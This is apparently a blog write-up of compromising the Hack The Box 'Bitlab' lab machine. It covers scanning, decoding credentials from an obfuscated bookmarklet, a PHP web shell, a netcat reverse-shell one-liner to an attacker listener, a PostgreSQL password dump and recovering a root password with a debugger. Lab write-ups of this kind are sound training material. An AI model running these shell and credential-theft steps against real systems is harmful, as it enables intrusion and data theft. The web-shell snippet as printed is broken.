---
title: Hack The Box Bitlab Write Up
published: true
---
Hey Guys.This is Chan and today I am gonna make a write up about bitlab from Hack The Box.

Sorry for being late to upload write up cause I have an exams in my school recently.

So let’s start.

Bit lab is a linux medium machine and I added the ip adress 10.10.10.114 as bitlab.htb to /etc/hosts. so let’s get jump in.


![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/bitlab/bitlab.png)

# [](#header-3)Nmap 
```
As always we will start with nmap to scan for open ports and services:
```
```
root@ch4n:~/Desktop/vpn# nmap -sC -sV bitlab.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-14 01:10 EST
Nmap scan report for bitlab.htb (10.10.10.114)
Host is up (0.26s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
80/tcp open  http    nginx
| http-robots.txt: 55 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://bitlab.htb/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.67 seconds
```
We got http on port 80 and ssh on port 22, robots.txt in nmap scan results.

# [](#header-3)Web Page

So let’s check web page
![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/bitlab/Webpage.png)

Here git lab is running on web server on port 80 and there is a git lab login so we need a credential to login.

So let’s check robots.txt from our initial nmap scan.
```
# See http://www.robotstxt.org/robotstxt.html for documentation on how to use the robots.txt file
#
# To ban all spiders from the entire site uncomment the next two lines:
# User-Agent: *
# Disallow: /

# Add a 1 second delay between successive requests to the same server, limits resources used by crawler
# Only some crawlers respect this setting, e.g. Googlebot does not
# Crawl-delay: 1

# Based on details in https://gitlab.com/gitlab-org/gitlab-ce/blob/master/config/routes.rb, https://gitlab.com/gitlab-org/gitlab-ce/blob/master/spec/routing, and using application
User-Agent: *
Disallow: /autocomplete/users
Disallow: /search
Disallow: /api
Disallow: /admin
Disallow: /profile
Disallow: /dashboard
Disallow: /projects/new
Disallow: /groups/new
Disallow: /groups/*/edit
Disallow: /users
Disallow: /help
# Only specifically allow the Sign In page to avoid very ugly search results
Allow: /users/sign_in

# Global snippets
User-Agent: *
Disallow: /s/
Disallow: /snippets/new
Disallow: /snippets/*/edit
Disallow: /snippets/*/raw

# Project details
User-Agent: *
Disallow: /*/*.git
Disallow: /*/*/fork/new
Disallow: /*/*/repository/archive*
Disallow: /*/*/activity
Disallow: /*/*/new
Disallow: /*/*/edit
Disallow: /*/*/raw
Disallow: /*/*/blame
Disallow: /*/*/commits/*/*
Disallow: /*/*/commit/*.patch
Disallow: /*/*/commit/*.diff
Disallow: /*/*/compare
Disallow: /*/*/branches/new
Disallow: /*/*/tags/new
Disallow: /*/*/network
Disallow: /*/*/graphs
Disallow: /*/*/milestones/new
Disallow: /*/*/milestones/*/edit
Disallow: /*/*/issues/new
Disallow: /*/*/issues/*/edit
Disallow: /*/*/merge_requests/new
Disallow: /*/*/merge_requests/*.patch
Disallow: /*/*/merge_requests/*.diff
Disallow: /*/*/merge_requests/*/edit
Disallow: /*/*/merge_requests/*/diffs
Disallow: /*/*/project_members/import
Disallow: /*/*/labels/new
Disallow: /*/*/labels/*/edit
Disallow: /*/*/wikis/*/edit
Disallow: /*/*/snippets/new
Disallow: /*/*/snippets/*/edit
Disallow: /*/*/snippets/*/raw
Disallow: /*/*/deploy_keys
Disallow: /*/*/hooks
Disallow: /*/*/services
Disallow: /*/*/protected_branches
Disallow: /*/*/uploads/
Disallow: /*/-/group_members
Disallow: /*/project_members
```
here we can see lot of disallow directories.

So let’s scan with gobuster.

```
root@ch4n:~# gobuster dir -u http://10.10.10.114 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.114
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/01/13 16:08:02 Starting gobuster
===============================================================
Error: the server returns a status code that matches the provided options for non existing urls. http://10.10.10.114/85c08f62-d433-43da-ac48-37890d552cec => 302. To force processing of Wildcard responses, specify the '--wildcard' switch
```
When we run gobuster, we got some errors.so I check  http://10.10.10.114/85c08f62-d433-43da-ac48-37890d552cec this link in web page it redirected to our web page also it was mention that  302 in gobuster.

So when I tried gobuster without 302,gobuster was probably worked.

After running gobuster,we got the list of directories.
```
root@ch4n:~# gobuster dir -u http://10.10.10.114 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 200,204,301,307,401,403
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.114
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/01/13 16:10:53 Starting gobuster
===============================================================
/search (Status: 200)
/help (Status: 301)
/profile (Status: 301)
/public (Status: 200)
/root (Status: 200)
/explore (Status: 200)
/ci (Status: 301)
```
```
When I check/help found a link called bookmarks.html:
```
![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/bitlab/help.png)
```
There was an interesting link called Gitlab Login:
```
![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/bitlab/bookmark.png)

When I click the link it doesn’t respond so I will check the web page source there is an interesting js code

```
<DT><A HREF="javascript:(function(){ var _0x4b18=[&quot;\x76\x61\x6C\x75\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&quot;,&quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&quot;,&quot;\x63\x6C\x61\x76\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&quot;,&quot;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&quot;];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()" ADD_DATE="1554932142">Gitlab Login</A>
    </DL><p>
</DL><p>
```
So I modified the code to excute js console

```
var _0x4b18=['\x76\x61\x6C\x75\x65','\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E','\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64','\x63\x6C\x61\x76\x65','\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64','\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78'];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5];
```
So I typed it like this in my terminal
```
root@ch4n:~# js
> var _0x4b18=['\x76\x61\x6C\x75\x65','\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E','\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64','\x63\x6C\x61\x76\x65','\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64','\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78'];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5];
Thrown:
ReferenceError: document is not defined
> _0x4b18
[ 'value',
  'user_login',
  'getElementById',
  'clave',
  'user_password',
  '11des0081x' ]
```
so we got the creds.
```
User – clave
password – 11des0081x
```

After logging in using this creds,I found two repo profile and developer
![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/bitlab/index.png)

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/bitlab/developer.png)

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/bitlab/profile.png)

In here I created a simple cmd shell.

```
<?php ($_REQUEST['cmd']); ?>
```
![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/bitlab/shell.png)

Then I check it with whoami cmd,it worked so let’s grab the reverse shell

I used this reverse shell
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```
from pentest monkey

then got the reverse shell as www-data

```
root@ch4n:~/HTB/bitlab# nc -lnvp 1234 Connection from 10.10.10.114:40202 Linux bitlab 4.15.0-29-generic #31-Ubuntu SMP Tue Jul 17 15:39:52 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux 15:17:39 up 5 min, 0 users, load average: 0.75, 0.79, 0.42 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can't access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data)


```
www-data@bitlab:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on bitlab:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
User www-data may run the following commands on bitlab:
    (root) NOPASSWD: /usr/bin/git pull
www-data@bitlab:/$
```

But I wasnt not able to perform anything so I need to try with postrge sql.
```
php -r '$db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");$result = pg_query($db_connection, "SELECT * FROM profiles");print_r(pg_fetch_all($result));'
```

```
Array
(
    [0] => Array
        (
            [id] => 1
            [username] => clave
            [password] => c3NoLXN0cjBuZy1wQHNz==
        )

)
```
then we got the user and pass fort ssh..
I decoded this base64 string then login to ssh.
```
 root@ch4n:~# echo -n c3NoLXN0cjBuZy1wQHNz==| base64 -d
ssh-str0ng-p@ssbase64: invalid input
```
it said like that so I decided to login to ssh with this pure base64 string then it worked:-) and grab the user.txt

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/bitlab/user.png)

# [](#header-3)Privillege Escalation
```
clave@bitlab:~$ ls -la
total 44
drwxr-xr-x 4 clave clave  4096 Aug  8 14:40 .
drwxr-xr-x 3 root  root   4096 Feb 28  2019 ..
lrwxrwxrwx 1 root  root      9 Feb 28  2019 .bash_history -> /dev/null
-rw-r--r-- 1 clave clave  3771 Feb 28  2019 .bashrc
drwx------ 2 clave clave  4096 Aug  8 14:40 .cache
drwx------ 3 clave clave  4096 Aug  8 14:40 .gnupg
-rw-r--r-- 1 clave clave   807 Feb 28  2019 .profile
-r-------- 1 clave clave 13824 Jul 30 19:58 RemoteConnection.exe
-r-------- 1 clave clave    33 Feb 28  2019 user.txt
```
there is an interesting file called RemoteConnection.exe
I downloaded this to my machine
And I added to x32 debugger  and I set a breeakpoint at acess denied got the ssh root password

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/bitlab/debugger.png)

```
“-ssh root@gitlab.htb -pw \“Qf7]8YSV.wDNF*[7d?j&eD4^\””
\”Qf7]8YSV.wDNF*[7d?j&eD4^\””
```
After logged into to ssh as a root user with this pass,we got root and grab the root flag:-)

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/bitlab/root.png)

That’s it guys

Enjoy my write up:-)
<script src="https://www.hackthebox.eu/badge/81292"></script>
